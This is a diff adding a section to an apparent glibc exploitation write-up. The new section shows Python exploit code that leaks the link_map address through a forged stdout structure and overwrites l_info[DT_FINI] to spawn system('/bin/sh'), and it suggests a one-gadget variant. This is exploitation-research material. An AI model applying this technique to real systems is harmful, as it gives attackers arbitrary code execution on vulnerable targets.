@@ -280,7 +280,39 @@ So as for previous mechanism, you can write to `l_info[DT_FINI]`  to makes it po
 
 that's even a bit simpler than "new-style" destructors as you have to forge only one structure.
 
+**exemple:** do you like it tricky?
 
+so let's give an example of getting code execution via overwriting `l_info[DT_FINI]` with a forged `Elfw(Dyn)`structure, and by controlling $rdi.
+
+```python
+# stdout read primitive
+def readmem(stdout_addr, addr, size, returned=0):
+  temp = p64(0xfbad1887) + p64(0)*3 + p64(addr) + p64(addr + size)*3 + p64(addr + size +1)
+  write(stdout_addr, temp)
+  if returned:
+    return p.read(size)
+
+map = u64(readmem(libc.sym['_IO_2_1_stdout_'], libc.address+0x1fdff0, 16, 1)[0:8])
+print('link_map address = '+hex(map))
+
+target = map+0xa8	# DT_FINI entry
+write(map,p64(u64('/bin/sh\x00')))		# overwrite map->l_addr with '/bin/sh' string
+payload = p64(target)+p64(0x10000000000000000+(libc.sym['system']-u64(b'/bin/sh\x00')))
+write(target, payload)
+
+```
+
+this small exemple leak libc `link_map` address by using stdout to leak it.
+
+then overwrite `map->l_addr` with string '/bin/sh
+
+then write a forged `Elfw(Dyn)` structure just next `DT_FINI` entry, with the offset of `system()` function minus '/bin/sh' string, the `map->l_addr + fini->d_un.d_ptr` calculation will give us  ̀system()` address.
+
+the result is a clean `system('/bin/sh')`
+
+you can find full exemple in file:  `exp_dt_fini.py`  (I leaved various debugging option to follow the code execution, especially a breakpoint at `*_dl_call_fini+94`)
+
+> another option could be to leave libc base address in `map->l_addr` and put a onegadget offset address in `map->l_info[DT_FINI]->d_un.d_ptr` forged structure,  the `map->l_addr + fini->d_un.d_ptr` calculation will give us right address of onegadget (but I find none that would pass), could work with a gadget too... let be creative !
 
 ------
 
